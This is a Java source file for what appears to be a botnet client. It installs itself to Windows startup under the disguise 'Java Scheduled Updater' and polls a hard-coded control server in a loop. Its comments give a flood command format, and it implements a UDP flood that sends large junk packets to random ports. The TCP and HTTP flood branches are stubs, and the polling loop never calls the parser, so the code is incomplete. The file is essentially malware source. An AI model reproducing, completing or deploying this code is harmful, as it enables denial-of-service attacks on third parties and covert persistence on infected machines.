package com.am77;

import com.am77.extern.HttpRequest;
import com.am77.extern.RegistryUtils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;

public class Client {

    public static Client instance;

    private Socket sock;
    private PrintWriter out;
    private BufferedReader in;
    private String killPacket;
    private int packSize = 65000;
    private String os = System.getProperty("os.name");
    public String filename = "jupdate.jar";  // Change this to your compiled name !!!VERY IMPORTANT!!!
    // Don't make the filename a dynamic filename, this will cause issues.

    public int port = 8080;
    public String host = "192.168.153.34";


    public static Client getInstance(){
        if (instance == null){
            instance = new Client();
        }
        return instance;
    }

    public String resolve(String host){
        try {
            if (host.contains("http://") ||
                    host.contains("https://") ||
                    host.contains("www.") ||
                    host.contains(".com") ||
                    host.contains(".net") ||
                    host.contains(".org") ||
                    host.contains(".gov") ||
                    host.contains(".nl")) {
                InetAddress address = InetAddress.getByName(host);
                return address.toString();

            } else {
                return host;
            }
        } catch (UnknownHostException uhe){
            uhe.printStackTrace();
        }
        // Return the IP if there was an error
        return host;
    }

    // The method that starts everything up
    public void start() throws Exception{

        // Fill packet with junk
        initPacket();

        // If windows, add the program to startup
        if (os.startsWith("Windows")) {
            addToStartup();
        }

        while (true) {

            HttpRequest request = HttpRequest.get("http://" + host + ":" + port);
            String res = request.body();


            //System.out.println("Disconnected, waiting for 5");
            //Thread.sleep(5000);
        }
    }

    private void addToStartup(){
        try {
            RegistryUtils.writeStringValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Updater", "\"" + System.getProperty("user.home") + "\\"  + filename + "\"");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    // Fills the packets with junk
    public void initPacket(){
        killPacket = "";
        for (int i = 0; i < packSize; i++){
            killPacket += "A";
        }
    }


    /*
     Command format:
         UDP flood: udp target time
         TCP flood: tcp target port threads time
         HTTP flood: http target time threads
     */
    public void parse(String msg){
        String[] resolved = msg.split(" ");

        try {
            if (msg.equals("NONE")){
                System.out.println("Got a none, waiting for 3");
                return;
            }
            if (msg.startsWith("udp") && resolved.length == 4) {
                udpFlood(resolved[1], Long.parseLong(resolved[2]));
            } else if (msg.startsWith("tcp")) {
                System.err.println("TCP");
            } else if (msg.startsWith("http")) {
                System.err.println("HTTP");
            } else ;
        } catch (Exception e){
            e.printStackTrace();
        }

    }
    public static void main(String[] args) {
        try {
            // TODO add multiple-instance protection to this
            getInstance().start();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    private void udpFlood(String host, final long duration) throws Exception {
        final String target = resolve(host);
        new Thread(new Runnable() {

            public void run() {
                try {
                    long endTime = System.currentTimeMillis() + duration;
                    DatagramSocket udpSocket = new DatagramSocket();
                    while (System.currentTimeMillis() < endTime) {

                        // Allocate some mem
                        byte[] data = new byte[65000];

                        // Fill the mem
                        data = killPacket.getBytes();
                        try {
                            // Send the junk data on a random port
                            udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(target), (int) (Math.random() * 65534) + 1));
                        } catch (IOException ioe){}
                    }
                    udpSocket.close();
                } catch (SocketException se) {
                }
            }
        }).start();
    }


}
